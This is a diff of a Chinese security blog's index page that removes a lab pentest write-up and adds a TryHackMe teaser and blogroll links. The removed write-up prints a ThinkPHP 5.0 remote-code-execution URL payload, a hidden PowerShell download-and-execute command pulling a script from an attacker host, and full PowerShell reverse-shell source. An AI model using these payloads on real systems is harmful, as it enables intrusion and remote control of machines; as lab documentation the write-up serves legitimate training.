@@ -205,113 +205,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2025/01/31/Thunder%E7%BB%BC%E5%90%88%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%84/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="noone___">
-      <meta itemprop="description" content="自闭中">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="noone___'s blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/01/31/Thunder%E7%BB%BC%E5%90%88%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%84/" class="post-title-link" itemprop="url">Thunder综合内网打靶日寄</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-01-31 19:26:00" itemprop="dateCreated datePublished" datetime="2025-01-31T19:26:00+08:00">2025-01-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-02 10:21:09" itemprop="dateModified" datetime="2025-02-02T10:21:09+08:00">2025-02-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <ul>
-<li><p>扫描打点</p>
-<p>  byd平台需要通过openvpn访问才给靶机 <code>ip</code></p>
-<p>  <img src="https://pic1.imgdb.cn/item/679c4412d0e0a243d4f8bb5f.png" alt=""></p>
-<p>  对于 <code>80</code> 的 <code>tp5.0</code> ，有rce：</p>
-<p>  <img src="https://pic1.imgdb.cn/item/679c46e7d0e0a243d4f8bba9.png" alt=""></p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[命令]</span><br></pre></td></tr></table></figure>
-<p>  注意下url编码</p>
-<p>  <code>whoami</code> 得到当前用户是 <code>NT AUTHORITY\LOCAL SERVICE</code> ，低权限的内置服务账户，应该要想办法横向先</p>
-<p>  <del>但curl不出来</del></p>
-<p>  套一层 <code>powershell</code> 可以 <code>curl</code> 到</p>
-  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell+<span class="literal">-nop</span>+<span class="literal">-c</span>+<span class="string">&quot;curl+http://172.16.233.2:8000&quot;</span></span><br></pre></td></tr></table></figure>
-<p>  <img src="https://pic1.imgdb.cn/item/679c8dfdd0e0a243d4f8c13c.png" alt=""></p>
-<p>  拿到反弹shell</p>
-  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell+<span class="literal">-nop</span>+<span class="literal">-w</span>+<span class="keyword">hidden</span>+<span class="literal">-c</span>+<span class="string">&quot;IEX+(New-Object+System.Net.WebClient).DownloadString(&#x27;http://172.16.233.2:8000/revshell.ps1&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
-<p>  revshell.ps1如下</p>
-  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$client = New-Object System.Net.Sockets.TCPClient(&quot;攻击机IP&quot;, 4444)</span><br><span class="line">$stream = $client.GetStream()</span><br><span class="line">$writer = New-Object System.IO.StreamWriter($stream)</span><br><span class="line">$writer.AutoFlush = $true</span><br><span class="line">$buffer = New-Object System.Byte[] 1024</span><br><span class="line">while ($true) &#123;</span><br><span class="line">    $writer.Write(&quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;)</span><br><span class="line">    $writer.Flush()</span><br><span class="line">    $read = $stream.Read($buffer, 0, 1024)</span><br><span class="line">    if ($read -le 0) &#123; break &#125;</span><br><span class="line">    $input = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)</span><br><span class="line">    $output = try &#123; Invoke-Expression -Command $input 2&gt;&amp;1 &#125; catch &#123; $_ &#125;</span><br><span class="line">    $writer.WriteLine($output)</span><br><span class="line">    $writer.Flush()</span><br><span class="line">&#125;</span><br><span class="line">$client.Close()</span><br></pre></td></tr></table></figure>
-<p>  <img src="https://pic1.imgdb.cn/item/679c8f25d0e0a243d4f8c15f.png" alt=""></p>
-</li>
-<li><p>提权</p>
-<p>  靶机不出网</p>
-<p>  进去以后是 <code>powershell</code> 的界面，有的地方需要强制转换为文本形式来输出，例：</p>
-<p>  <img src="https://pic1.imgdb.cn/item/679c9351d0e0a243d4f8c1e6.png" alt=""></p>
-<p>  由此可以看到：</p>
-<p>  <img src="https://pic1.imgdb.cn/item/679c9609d0e0a243d4f8c219.png" alt=""></p>
-<p>  但是手动提权失败</p>
-<p>  <img src="https://pic1.imgdb.cn/item/679c980bd0e0a243d4f8c24c.png" alt=""></p>
-<p>  传东西上去也不行</p>
-<p>  <img src="https://pic1.imgdb.cn/item/679c9986d0e0a243d4f8c269.png" alt=""></p>
-<p>  内存注入也不行</p>
-<p>  <img src="https://pic1.imgdb.cn/item/679c9c2dd0e0a243d4f8c293.png" alt=""></p>
-<p>  <code>tasklist /svc</code> 显示进程能看见360，要做免杀了</p>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2025/01/25/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8462%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1056,6 +949,87 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2024/12/20/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8455%EF%BC%9AAdvent%20of%20Cyber%202024%EF%BC%9ADay19/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/12/20/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8455%EF%BC%9AAdvent%20of%20Cyber%202024%EF%BC%9ADay19/" class="post-title-link" itemprop="url">THM打靶日寄55-Advent of Cyber 2024：Day19</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-12-20 08:26:00" itemprop="dateCreated datePublished" datetime="2024-12-20T08:26:00+08:00">2024-12-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-12-21 20:23:01" itemprop="dateModified" datetime="2024-12-21T20:23:01+08:00">2024-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>唔，这个有点难QAQ</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/12/20/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8455%EF%BC%9AAdvent%20of%20Cyber%202024%EF%BC%9ADay19/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -1127,7 +1101,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">227</span>
+          <span class="site-state-item-count">226</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1168,6 +1142,15 @@
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://www.cnblogs.com/Vitheon/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vitheon&#x2F;" rel="noopener" target="_blank">Vareal</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://coperlm.github.io/" title="https:&#x2F;&#x2F;coperlm.github.io&#x2F;" rel="noopener" target="_blank">coper</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://haicaji.github.io/" title="https:&#x2F;&#x2F;haicaji.github.io&#x2F;" rel="noopener" target="_blank">haicaji</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://c12en.top/" title="http:&#x2F;&#x2F;c12en.top" rel="noopener" target="_blank">C12en</a>
         </li>
     </ul>
   </div>
